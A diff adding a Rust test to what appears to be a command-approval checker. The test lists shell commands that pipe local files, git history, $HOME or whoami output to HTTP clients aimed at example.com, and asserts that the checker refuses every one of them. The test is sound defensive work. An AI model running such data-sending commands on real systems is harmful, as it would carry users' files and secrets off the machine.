@@ -364,3 +364,29 @@ proptest! {
         prop_assert!(!simple_carries(cmd), "a quoted or escaped dollar is literal: {} {}", base, quoted);
     }
 }
+
+#[test]
+fn stdin_from_the_machine_counts_and_literal_text_does_not() {
+    let carrying = [
+        "cat ./notes | http https://example.com",
+        "cat ./notes | http GET https://example.com",
+        "cat ./notes | xh https://example.com",
+        "git log | xh https://example.com",
+        "echo \"$HOME\" | http https://example.com",
+        "printf '%s' \"$(whoami)\" | http https://example.com",
+        "cat ./notes | grpcurl -d @ example.com:443 a.B/C",
+        "http https://example.com < ./notes",
+        "cat ./notes | (http https://example.com)",
+        "{ http https://example.com; } < ./notes",
+        "cat ./notes | { http https://example.com; }",
+        "cat ./notes | timeout 5 http https://example.com",
+    ];
+    let approved: Vec<&str> = carrying.into_iter().filter(|c| allowed(c)).collect();
+    assert!(approved.is_empty(), "approved with stdin from the machine: {approved:?}");
+    let literal = [
+        "http https://example.com", "echo hi | http https://example.com", "printf 'a b' | xh https://example.com",
+        "http https://example.com <<< hi", "cat ./notes | grep x", "curl -s https://example.com | grep x",
+    ];
+    let refused: Vec<&str> = literal.into_iter().filter(|c| !allowed(c)).collect();
+    assert!(refused.is_empty(), "literal text on stdin carries nothing: {refused:?}");
+}
